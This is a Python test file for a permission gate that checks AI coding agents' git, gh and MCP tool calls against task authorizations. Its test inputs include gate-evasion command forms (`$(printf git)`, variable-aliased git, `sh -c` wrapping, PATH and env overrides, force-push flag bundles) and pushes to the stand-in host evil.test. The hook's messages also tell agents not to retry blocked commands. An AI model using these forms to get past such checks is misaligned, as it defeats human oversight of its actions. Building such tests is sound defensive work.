        check("PATH 覆盖不得替换受信 git 可执行", run_hook("Bash", {"command": "PATH=/custom/bin git push origin feature/TAP-123"}, ws), "ask")
        check("Git 传输环境覆盖时停止", run_hook("Bash", {"command": "GIT_SSH_COMMAND='ssh -F custom' git push origin feature/TAP-123"}, ws), "ask")
        check("env 清空环境时停止", run_hook("Bash", {"command": "env -i git push origin feature/TAP-123"}, ws), "ask")
        check("env 取消 PATH 时停止", run_hook("Bash", {"command": "env -u PATH git push origin feature/TAP-123"}, ws), "ask")
        check("授权后 MCP 建 PR 放行", run_hook("mcp__github__create_pull_request", {"title": "t"}, ws), "allow")
        check(
            "MCP 显式指定未授权仓库时收回放行",
            run_hook(
                "mcp__github__create_pull_request",
                {"owner": "acme", "repo": "other-repo", "head": "feature/TAP-123"},
                ws,
            ),
            "ask",
        )
        check("授权后 gh pr create 放行", run_hook("Bash", {"command": "gh pr create --title t --body b"}, ws), "allow")
        check("复合 gh PR 不得跨仓库共用 target", run_hook("Bash", {"command": "gh pr create -R acme/widget --title t --body b && gh pr edit 1 -R acme/other --title t"}, ws), "ask")
        check("复合同仓库 gh PR 正常合并", run_hook("Bash", {"command": "gh pr create -R acme/widget --title t --body b && gh pr edit 1 --repo acme/widget --title t"}, ws), "allow")
        check(
            "普通任务授权不覆盖 Source Pool 管理",
            run_hook("Bash", {"command": "git fetch origin develop"}, ws),
            "ask",
        )

        # ---- 同一项目空间多个 active 任务按仓库+分支解析 -----------------
        grant(ws, issue_key="TAP-999", work_branch="feature/TAP-999")
        subprocess.run(["git", "checkout", "-q", "-b", "feature/TAP-999"], cwd=ws, check=True)
        check("第二个 active 任务使用自己的授权", run_hook("Bash", {"command": "git commit -m x"}, ws), "allow")
        subprocess.run(["git", "checkout", "-q", "feature/TAP-123"], cwd=ws, check=True)
        check("切回分支后恢复第一个任务授权", run_hook("Bash", {"command": "git commit -m x"}, ws), "allow")
        grant(ws, issue_key="TAP-999", work_branch="feature/TAP-123")
        check("两个 active 任务上下文冲突时保守停止", run_hook("Bash", {"command": "git commit -m x"}, ws), "ask")
        grant(ws, issue_key="TAP-999", work_branch="feature/TAP-999")

        # ---- 授权伞永不覆盖的高危操作 -----------------------------------
        check("merge 始终需单独确认", run_hook("Bash", {"command": "git merge develop"}, ws), "ask")
        check("gh pr merge 始终需单独确认", run_hook("Bash", {"command": "gh pr merge 42 --squash"}, ws), "ask")
        check("gh release 始终需单独确认", run_hook("Bash", {"command": "gh release create v1.0"}, ws), "ask")
        check("Jira transition 不在伞内，需确认", run_hook("mcp__atlassian__transition_issue", {"issueKey": "TAP-123"}, ws), "ask")
        not_covered = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["transition_jira_status"],
            "target": {"issue_key": "TAP-123", "branch_relevant": False},
        })
        check("有效授权未覆盖操作使用独立原因码", not_covered["reason_code"], "operation_not_covered")

        # ---- forbidden --------------------------------------------------
        check("强推直接拒绝", run_hook("Bash", {"command": "git push --force origin feature/TAP-123"}, ws), "deny")
        check("带值 force-with-lease 强推直接拒绝", run_hook("Bash", {"command": "git push --force-with-lease=refs/heads/feature/TAP-123 origin feature/TAP-123"}, ws), "deny")
        check("短选项束中的 force 强推直接拒绝", run_hook("Bash", {"command": "command git push -fu origin feature/TAP-123"}, ws), "deny")
        check("IPv4 短选项束中的 force 强推直接拒绝", run_hook("Bash", {"command": "git push -f4 --dry-run origin feature/TAP-123"}, ws), "deny")
        check("IPv6 短选项束中的 force 强推直接拒绝", run_hook("Bash", {"command": "git push -f6 --dry-run origin feature/TAP-123"}, ws), "deny")
        check("commit --amend（改历史）拒绝", run_hook("Bash", {"command": "git commit --amend"}, ws), "deny")
        check("push 保护分支拒绝", run_hook("Bash", {"command": "git push origin main"}, ws), "deny")
        check("push release/* 保护分支拒绝", run_hook("Bash", {"command": "git push origin HEAD:release/v0.7"}, ws), "deny")

        # ---- 绑定失效 ---------------------------------------------------
        subprocess.run(["git", "checkout", "-q", "-b", "other-branch"], cwd=ws, check=True)
        check("切到未授权分支后 push 收回放行", run_hook("Bash", {"command": "git push origin other-branch"}, ws), "ask")
        subprocess.run(["git", "checkout", "-q", "feature/TAP-123"], cwd=ws, check=True)
        check("切回授权分支恢复放行", run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws), "allow")

        second = ws / "service-api"
        second.mkdir()
        subprocess.run(["git", "init", "-q", "-b", "feature/TAP-123-api"], cwd=second, check=True)
        subprocess.run(["git", "remote", "add", "origin", "git@github.com:acme/service-api.git"], cwd=second, check=True)
        (second / "README.md").write_text("api\n", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=second, check=True)
        subprocess.run(
            ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"],
            cwd=second,
            check=True,
        )
        grant(ws, extra_repositories=[{
            "repository": "acme/service-api",
            "authorized_endpoint": "github.com/acme/service-api",
            "work_branch": "feature/TAP-123-api",
            "base_branch": "develop",
            "base_sha": "2" * 40,
            "approved_scope": "API 配套修改",
            "verification_method": "python3 -m unittest",
            "pull_request": None,
            "ci": None,
        }])
        check("同一任务第二仓库 commit 放行", run_hook("Bash", {"command": "git commit -m x"}, second), "allow")
        check("第二仓库审计写到 TAP-123 任务目录", task_store.events_path(ws, "TAP-123").is_file(), True)

        grant(ws, target_repo="acme/other-repo")
        check("授权仓库不匹配收回放行", run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws), "ask")

        grant(ws)
        subprocess.run([sys.executable, str(ROOT / "workflow" / "authorization.py"), "revoke", "--issue-key", "TAP-123", "--dir", str(ws)], check=True, capture_output=True)
        check("撤销授权后收回放行", run_hook("Bash", {"command": "git commit -m x"}, ws), "ask")

        # ---- 正向命中与未命中透传 ---------------------------------------
        check("未映射 mcp 交还 Agent 原生权限", run_hook("mcp__github__run_secret_scanning", {}, ws), "passthrough")
        check("MCP 同名工具不跨服务误映射", run_hook("mcp__slack__add_comment", {}, ws), "passthrough")
        check("MCP 合并工具不跨服务误映射", run_hook("mcp__custom__merge_pull_request", {}, ws), "passthrough")
        check("gh api POST 需确认", run_hook("Bash", {"command": "gh api -X POST /repos/a/b/issues -f title=x"}, ws), "ask")
        check("复合命令取最严格（status; push --force）", run_hook("Bash", {"command": "git status && git push -f origin feature/TAP-123"}, ws), "deny")

        unknown_command = "node takeover.js --issue-key TAP-12774 --token super-secret"
        check("Claude 普通未映射命令透传", run_hook("Bash", {"command": unknown_command}, ws), "passthrough")
        check("Codex 普通未映射命令透传", run_codex("Bash", {"command": unknown_command}, ws), "allow")
        inspection_command = (
            "sed -n '1,240p' .agents/skills/tapdata-task/SKILL.md && "
            "rg -n -i -C 2 'TAP-12289|takeover|接管' memory.md && "
            "sed -n '1,260p' projects/tapdata/admission.json"
        )
        check("Claude 引号内管道符的只读检查透传", run_hook("Bash", {"command": inspection_command}, ws), "passthrough")
        check("Codex 引号内管道符的只读检查透传", run_codex("Bash", {"command": inspection_command}, ws), "allow")
        check(
            "Codex 未映射 MCP 透传",
            run_codex("mcp__github__run_secret_scanning", {"repository": "acme/widget"}, ws),
            "allow",
        )

        ambiguous_command = "sh -c 'git push origin feature/TAP-123' --token super-secret"
        claude_ambiguous = run_hook_output("Bash", {"command": ambiguous_command}, ws)
        claude_reason = claude_ambiguous["hookSpecificOutput"]["permissionDecisionReason"]
        check("Claude 受控操作歧义仍需确认", "判定：unknown_external_write" in claude_reason, True)
        check("Claude 受控操作歧义隐藏敏感值", "super-secret" in claude_reason, False)
        codex_ambiguous = run_codex_output("Bash", {"command": ambiguous_command}, ws)
        codex_ambiguous_reason = codex_ambiguous["hookSpecificOutput"]["permissionDecisionReason"]
        check("Codex 受控操作歧义降级为拒绝", codex_ambiguous["hookSpecificOutput"]["permissionDecision"], "deny")
        check("Codex 受控操作歧义给出 Shell 人工接力", "在自己的终端核对并执行上述命令" in codex_ambiguous_reason, True)

        preview_command = (
            "sh -c 'git push origin feature/TAP-123' --token super-secret mysql -pmysql-secret "
            "curl -u user:pass PRIVATE_KEY=private-value AUTHORIZATION=auth-secret\x1b[31m"
        )
        preview_reason = run_hook_output("Bash", {"command": preview_command}, ws)["hookSpecificOutput"]["permissionDecisionReason"]
        for secret in ("super-secret", "mysql-secret", "user:pass", "private-value", "auth-secret", "\x1b"):
            check("命令摘要不泄露敏感值：%s" % secret.encode("unicode_escape").decode(), secret in preview_reason, False)
        check("命令摘要不再误称原始命令", "原始命令" in preview_reason, False)

        for agent, output in (
            ("Claude", run_hook_output("Bash", "invalid-tool-input", ws)),
            ("Codex", run_codex_output("Bash", "invalid-tool-input", ws)),
        ):
            failure = output["hookSpecificOutput"]
            check("%s Hook 异常失败关闭" % agent, failure["permissionDecision"], "deny")
            check("%s Hook 异常使用统一原因码" % agent, "[agenticops:adapter_failure]" in failure["permissionDecisionReason"], True)

        # ---- Agent Adapter 语义一致性 -----------------------------------
        parity_cases = [
            ("Bash", {"command": "git commit -m x"}),
            ("Bash", {"command": "git push origin feature/TAP-123"}),
            ("Bash", {"command": "git push origin main"}),
            ("Bash", {"command": "git merge develop"}),
            ("Bash", {"command": unknown_command}),
            ("mcp__atlassian__transition_issue", {"issueKey": "TAP-123"}),
            ("mcp__atlassian__add_comment", {"issueKey": "TAP-123"}),
            ("mcp__github__run_secret_scanning", {"repository": "acme/widget"}),
            ("mcp__slack__add_comment", {}),
            ("mcp__custom__merge_pull_request", {}),
        ]
        for tool, tool_input in parity_cases:
            claude = run_hook(tool, tool_input, ws)
            codex = run_codex(tool, tool_input, ws)
            expected = "deny" if claude in ("ask", "deny") else "allow"
            check("Codex 二态结果符合标准语义：%s" % tool.split("__")[-1], codex, expected)

        codex_block = run_codex_output("Bash", {"command": "git merge develop"}, ws)
        codex_reason = codex_block["hookSpecificOutput"]["permissionDecisionReason"]
        check("Codex ask 降级提示要求立即展示并停止", "必须立即向研发工程师展示" in codex_reason, True)
        check("Codex ask 降级提示不再重复旧兼容说明", "Hook 不支持 ask" in codex_reason, False)
        check("Codex ask 降级提示包含单一下一步", codex_reason.count("下一步："), 1)
        check("Codex ask 降级提示只包含一个原因前缀", codex_reason.count("[agenticops:"), 1)
        check("Codex 未覆盖操作要求人工执行而非聊天批准重试", "在自己的终端执行原命令" in codex_reason, True)
        check("Codex 未覆盖操作明确禁止 Agent 重试", "Agent 不得重试该命令" in codex_reason, True)

        # ---- 审计留痕 ---------------------------------------------------
        events = task_store.events_path(ws, "TAP-123").read_text(encoding="utf-8").strip().splitlines()
        check("审计事件已记录（>=20 条）", len(events) >= 20, True)
        audited = [json.loads(item) for item in events]
        check("审计记录 reason_code", all(item.get("reason_code") for item in audited), True)
        check("人工处理事件审计 required_action", any(item.get("required_action") for item in audited if item["decision"] != "allow"), True)

        # ---- OPA 一致性 -------------------------------------------------
        if shutil.which("opa"):
            grant(ws)
            subprocess.run(
                ["git", "config", "--unset-all", "remote.origin.pushurl"],
                cwd=ws,
                check=True,
            )
            subprocess.run(
                [
                    "git", "config", "--add", rewrite_key,
                    "git@github.com:acme/widget.git",
                ],
                cwd=ws,
                check=True,
            )
            py_rewritten_origin = run_hook(
                "Bash", {"command": "git push origin feature/TAP-123"}, ws
            )
            opa_rewritten_origin = run_hook(
                "Bash",
                {"command": "git push origin feature/TAP-123"},
                ws,
                env_extra={"AO_GATE_USE_OPA": "1"},
            )
            check("Python insteadOf 信任链拒绝", py_rewritten_origin, "deny")
            check("OPA insteadOf 信任链一致", opa_rewritten_origin, py_rewritten_origin)
            subprocess.run(
                ["git", "config", "--unset-all", rewrite_key], cwd=ws, check=True
            )
            subprocess.run(
                [
                    "git", "config", "--add", "remote.origin.url",
                    "git@evil.test:acme/widget.git",
                ],
                cwd=ws,
                check=True,
            )
            py_multiple_raw = run_hook(
                "Bash", {"command": "git push origin feature/TAP-123"}, ws
            )
            opa_multiple_raw = run_hook(
                "Bash",
                {"command": "git push origin feature/TAP-123"},
                ws,
                env_extra={"AO_GATE_USE_OPA": "1"},
            )
            check("Python raw origin 多值拒绝", py_multiple_raw, "deny")
            check("OPA raw origin 多值一致", opa_multiple_raw, py_multiple_raw)
            subprocess.run(
                ["git", "config", "--unset-all", "remote.origin.url"], cwd=ws, check=True
            )
            subprocess.run(
                [
                    "git", "config", "--add", "remote.origin.url",
                    "git@github.com:acme/widget.git",
                ],
                cwd=ws,
                check=True,
            )
            subprocess.run(
                [
                    "git", "remote", "set-url", "--add", "--push", "origin",
                    "git@evil.test:acme/widget.git",
                ],
                cwd=ws,
                check=True,
            )
            py_untrusted_push = run_hook(
                "Bash", {"command": "git push origin feature/TAP-123"}, ws
            )
            opa_untrusted_push = run_hook(
                "Bash",
                {"command": "git push origin feature/TAP-123"},
                ws,
                env_extra={"AO_GATE_USE_OPA": "1"},
            )
            check("Python 实际 pushurl 错配拒绝", py_untrusted_push, "deny")
            check("OPA 实际 pushurl 错配一致", opa_untrusted_push, py_untrusted_push)
            subprocess.run(
                ["git", "config", "--unset-all", "remote.origin.pushurl"],
                cwd=ws,
                check=True,
            )
            for push_url in (
                "git@github.com:acme/widget.git",
                "git@evil.test:acme/widget.git",
            ):
                subprocess.run(
                    [
                        "git", "remote", "set-url", "--add", "--push", "origin",
                        push_url,
                    ],
                    cwd=ws,
                    check=True,
                )
            py_ambiguous_push = run_hook(
                "Bash", {"command": "git push origin feature/TAP-123"}, ws
            )
            opa_ambiguous_push = run_hook(
                "Bash",
                {"command": "git push origin feature/TAP-123"},
                ws,
                env_extra={"AO_GATE_USE_OPA": "1"},
            )
            check("Python 多 pushurl 拒绝", py_ambiguous_push, "deny")
            check("OPA 多 pushurl 一致", opa_ambiguous_push, py_ambiguous_push)
            subprocess.run(
                ["git", "config", "--unset-all", "remote.origin.pushurl"],
                cwd=ws,
                check=True,
            )
            subprocess.run(
                [
                    "git", "remote", "set-url", "--add", "--push", "origin",
                    "git@github.com:acme/widget.git",
                ],
                cwd=ws,
                check=True,
            )
            parity_cases = [
                ("Bash", {"command": "git commit -m x"}),
                ("Bash", {"command": "git push origin feature/TAP-123"}),
                ("Bash", {"command": "git push origin HEAD:feature/TAP-123"}),
                ("Bash", {"command": "git push origin HEAD:feature/TAP-999"}),
                ("Bash", {"command": "git push origin evil:feature/TAP-123"}),
                ("Bash", {"command": "git push origin HEAD:refs/tags/v1"}),
                ("Bash", {"command": "git push upstream feature/TAP-123"}),
                ("Bash", {"command": "git -c color.ui=false push origin feature/TAP-123"}),
                ("Bash", {"command": "workflow/task.py repository prepare --issue-key TAP-123 --issue-key=TAP-123"}),
                ("Bash", {"command": "git -c color.ui=false status --short"}),
                ("Bash", {"command": "git status & git push -f origin feature/TAP-123"}),
                ("Bash", {"command": "if git status; then git push origin feature/TAP-123; fi"}),
                ("Bash", {"command": "sh -c 'git push origin feature/TAP-123'"}),
                ("Bash", {"command": "sudo git push origin feature/TAP-123"}),
                ("Bash", {"command": "python3 -c 'print(1)'"}),
                ("Bash", {"command": "python3 -m workflow.other"}),
                ("Bash", {"command": "python3 unregistered.py"}),
                ("Bash", {"command": "perl -we 'print 1'"}),
                ("Bash", {"command": "perl payload.pl"}),
                ("Bash", {"command": "node --eval='console.log(1)'"}),
                ("Bash", {"command": "nodejs payload.js"}),
                ("Bash", {"command": "python3 --version"}),
                ("Bash", {"command": "git push --delete origin feature/TAP-123"}),
                ("Bash", {"command": "git push --follow-tags origin feature/TAP-123"}),
                ("Bash", {"command": "git push origin 'refs/heads/*:refs/heads/*'"}),
                ("Bash", {"command": "env AO_MODE=test git push --force-with-lease=feature/TAP-123 origin feature/TAP-123"}),
                ("Bash", {"command": "env -S 'git push origin feature/TAP-123'"}),
                ("Bash", {"command": "$(printf git) push origin feature/TAP-123"}),
                ("Bash", {"command": "G=git; $G push origin feature/TAP-123"}),
                ("Bash", {"command": "PATH=/custom/bin git push origin feature/TAP-123"}),
                ("Bash", {"command": "git -C /other push origin feature/TAP-123"}),
                ("Bash", {"command": "git -C /other rev-parse HEAD"}),
                ("Bash", {"command": "git push origin main"}),
                ("Bash", {"command": "git merge develop"}),
                ("mcp__atlassian__transition_issue", {"issueKey": "TAP-123"}),
                ("mcp__atlassian__add_comment", {"issueKey": "TAP-123"}),
            ]
            for tool, tin in parity_cases:
                py = run_hook(tool, tin, ws)
                opa = run_hook(tool, tin, ws, env_extra={"AO_GATE_USE_OPA": "1"})
                check("OPA 一致性：%s %s" % (tool.split("__")[-1], tin.get("command", "")), opa, py)
            task_store.register(ws, "TAP-555", status="active")
            reason_cases = [
                ("prepare_task_repository", "TAP-123", "controlled_prepare_allowed"),
                ("git_commit", "TAP-404", "no_active_task"),
                ("git_commit", "TAP-555", "authorization_missing"),
                ("transition_jira_status", "TAP-123", "operation_not_covered"),
            ]
            for operation, issue_key, expected_reason_code in reason_cases:
                request = {
                    "protocol_version": 1,
                    "event": "before_operation",
                    "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
                    "cwd": str(ws),
                    "operations": [operation],
                    "target": {"issue_key": issue_key, "branch_relevant": False},
                }
                py = run_standard(request)
                opa = run_standard(request, env_extra={"AO_GATE_USE_OPA": "1"})
                check("Python 原因码：%s" % expected_reason_code, py["reason_code"], expected_reason_code)
                check("OPA 原因码一致：%s" % expected_reason_code, opa["reason_code"], py["reason_code"])
                check(
                    "OPA 处理动作存在性一致：%s" % expected_reason_code,
                    bool(opa.get("required_action")),
                    bool(py.get("required_action")),
                )
            authorization_path = task_store.task_directory(ws, "TAP-123") / "authorization.json"
            original_authorization = json.loads(authorization_path.read_text(encoding="utf-8"))
            repository = original_authorization["repositories"][0]
            malformed_authorizations = {
                "duplicate_repository": dict(
                    original_authorization,
                    repositories=[dict(repository), dict(repository)],
                ),
                "non_object_repository": dict(
                    original_authorization,
                    repositories=[dict(repository), "invalid"],
                ),
                "malformed_repository_collection": dict(
                    original_authorization,
                    repositories={"repository": dict(repository)},
                ),
                "missing_repository_binding": dict(
                    original_authorization,
                    repositories=[{key: value for key, value in repository.items() if key != "base_sha"}],
                ),
            }
            auth_request = {
                "protocol_version": 1,
                "event": "before_operation",
                "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
                "cwd": str(ws),
                "operations": ["git_commit"],
                "target": {"issue_key": "TAP-123"},
            }
            try:
                for name, authorization in malformed_authorizations.items():
                    authorization_path.write_text(json.dumps(authorization), encoding="utf-8")
                    py = run_standard(auth_request)
                    opa = run_standard(auth_request, env_extra={"AO_GATE_USE_OPA": "1"})
                    check("Python 拒绝畸形授权：%s" % name, py["decision"], "ask")
                    check("Python 畸形授权原因码：%s" % name, py["reason_code"], "authorization_invalid")
                    check("OPA 拒绝畸形授权：%s" % name, opa["decision"], py["decision"])
                    check("OPA 畸形授权原因码：%s" % name, opa["reason_code"], py["reason_code"])
            finally:
                authorization_path.write_text(
                    json.dumps(original_authorization), encoding="utf-8"
                )
            empty_or_invalid_values = ("", None, False, 123)
            for binding in ("issue_key", "agentic_run_id", "agent_id", "approved_plan_version"):
                for value in empty_or_invalid_values:
                    authorization = json.loads(json.dumps(original_authorization))
                    authorization[binding] = value
                    authorization_path.write_text(json.dumps(authorization), encoding="utf-8")
                    py = run_standard(auth_request)
                    opa = run_standard(auth_request, env_extra={"AO_GATE_USE_OPA": "1"})
                    check(
                        "required binding parity：%s=%r" % (binding, value),
                        (py["decision"], py["reason_code"], opa["decision"], opa["reason_code"]),
                        ("ask", "authorization_invalid", "ask", "authorization_invalid"),
                    )
            for binding in (
                "repository", "work_branch", "base_branch", "base_sha",
                "approved_scope", "verification_method",
            ):
                for value in empty_or_invalid_values:
                    authorization = json.loads(json.dumps(original_authorization))
                    authorization["repositories"][0][binding] = value
                    authorization_path.write_text(json.dumps(authorization), encoding="utf-8")
                    py = run_standard(auth_request)
                    opa = run_standard(auth_request, env_extra={"AO_GATE_USE_OPA": "1"})
                    check(
                        "repository binding parity：%s=%r" % (binding, value),
                        (py["decision"], py["reason_code"], opa["decision"], opa["reason_code"]),
                        ("ask", "authorization_invalid", "ask", "authorization_invalid"),
                    )
            push_auth_request = {
                "protocol_version": 1,
                "event": "before_operation",
                "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
                "cwd": str(ws),
                "operations": ["git_push"],
                "target": {
                    "issue_key": "TAP-123",
                    "push_source_ref": "HEAD",
                    "push_destination_ref": "refs/heads/feature/TAP-123",
                    "push_target_branch": "feature/TAP-123",
                },
            }
            for value in (None, "", ["github.com/acme/widget"], "evil.test/acme/widget"):
                authorization = json.loads(json.dumps(original_authorization))
                if value is None:
                    authorization["repositories"][0].pop("authorized_endpoint", None)
                else:
                    authorization["repositories"][0]["authorized_endpoint"] = value
                authorization_path.write_text(json.dumps(authorization), encoding="utf-8")
                py = run_standard(push_auth_request)
                opa = run_standard(push_auth_request, env_extra={"AO_GATE_USE_OPA": "1"})
                check(
                    "push authorized_endpoint parity：%r" % (value,),
                    (py["decision"], py["reason_code"], opa["decision"], opa["reason_code"]),
                    ("deny", "untrusted_push_repository", "deny", "untrusted_push_repository"),
                )
            authorization_path.write_text(
                json.dumps(original_authorization), encoding="utf-8"
            )
        else:
            print("[SKIP] 未安装 opa，跳过一致性校验")
    finally:
        shutil.rmtree(ws, ignore_errors=True)

    print("\n结果：%d 通过，%d 失败" % (PASS, FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
